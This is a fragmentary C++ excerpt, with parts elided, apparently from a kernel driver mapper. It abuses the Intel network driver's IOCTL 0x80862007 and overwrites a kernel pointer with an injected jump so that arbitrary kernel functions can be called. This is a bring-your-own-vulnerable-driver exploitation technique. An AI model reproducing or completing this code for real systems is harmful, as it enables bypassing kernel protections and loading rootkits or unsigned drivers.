...
namespace intel_driver
{
	...
	constexpr uint32_t ioct11 = 0x80862007;
	...
	bool CallKernelFunction(HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		...
		if (ntdll == 0) {
			Log(x("[-] Failed to load ntdll.dll") << std::endl); // never should happen
			return false;
		}
		...
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;
		...
		// Overwrite the pointer with kernel_function_address | Thanks vanity for the idea <3
